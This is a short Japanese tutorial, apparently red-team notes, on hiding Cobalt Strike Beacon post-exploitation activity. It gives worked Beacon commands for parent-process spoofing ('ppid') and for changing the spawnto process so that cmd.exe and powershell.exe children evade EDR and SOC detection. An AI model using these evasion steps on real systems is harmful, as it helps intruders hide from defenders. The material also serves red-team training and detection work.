新しいプロセスを起動するpost-exコマンドを、周囲の環境に自然に溶け込ませる方法

`shell`、`run`、`execute-assembly`、`powerpick`などのコマンドはデフォルトで**Beaconが動いているプロセスの子プロセスとして**新しいプロセスを起動
```
msedge.exe（Beacon動作中）
  ├─ cmd.exe        ← shell コマンド
  ├─ powershell.exe ← powerpick コマンド
  └─ notepad.exe    ← execute-assembly 等

→ ブラウザがcmd.exeやpowershell.exeを
  子プロセスとして起動するのは明らかに不自然
→ EDRやSOCに即座に検出される
```

## ppid
`ppid`コマンドで**親プロセスを偽装**
```bash
# まず ps コマンドかProcess Browserで
# 親にしたいプロセスのPIDを確認する

beacon> ps

# explorer.exe（PID: 6696）を親に偽装する
beacon> ppid 6696
[*] Tasked beacon to spoof 6696 as parent process

# この状態でshellを実行すると...
beacon> shell timeout 60
[*] Tasked beacon to run: timeout 60
```

## spawnto（execute-assembly・powerpick向け）
Fork & Runコマンドには`spawnto`で**犠牲プロセス自体を変更可能**

```
# ppidをexplorerに設定
beacon> ppid 6696

# spawntoをmsedge.exeに設定
# → 「msedge.exeがmsedge.exeを子として起動する」
#    という自然な親子関係になる
beacon> spawnto x64 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --profile-directory=Default
[*] Tasked beacon to spawn x64 features to: "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --profile-directory=Default

# powerpickを実行
beacon> powerpick start-sleep -s 60
```